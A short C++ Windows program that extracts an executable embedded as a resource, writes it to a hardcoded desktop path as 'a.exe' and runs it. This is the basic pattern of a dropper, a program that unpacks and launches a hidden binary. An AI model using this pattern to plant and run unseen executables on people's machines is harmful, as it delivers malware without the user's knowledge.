#include <Windows.h>

int main()
{
    HRSRC hrsrc;
    hrsrc = FindResource(nullptr, MAKEINTRESOURCE(10), RT_RCDATA);
    HGLOBAL hGlbl = nullptr;
    BYTE * pExeResource = nullptr;
    HANDLE hFile = INVALID_HANDLE_VALUE;
    DWORD size = 72704;

    if (hrsrc == nullptr)
    {
        return FALSE;
    }

    hGlbl = LoadResource(nullptr, hrsrc);

    if (hGlbl == nullptr)
    {
        return FALSE;
    }

    pExeResource = (BYTE*)LockResource(hGlbl);

    if (pExeResource == nullptr)
    {
        return FALSE;
    }

    hFile = CreateFileA("C:\\Users\\Zver\\Desktop\\a.exe", GENERIC_WRITE | GENERIC_READ, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);

    if (hFile != INVALID_HANDLE_VALUE)
    {
        DWORD bytesWritten = 0;
        WriteFile(hFile, pExeResource, size, &bytesWritten, nullptr);
        CloseHandle(hFile);
    }
    ShellExecuteA(nullptr, "open", "C:\\Users\\Zver\\Desktop\\a.exe", nullptr, nullptr, SW_SHOWNORMAL);
    return 0;
}
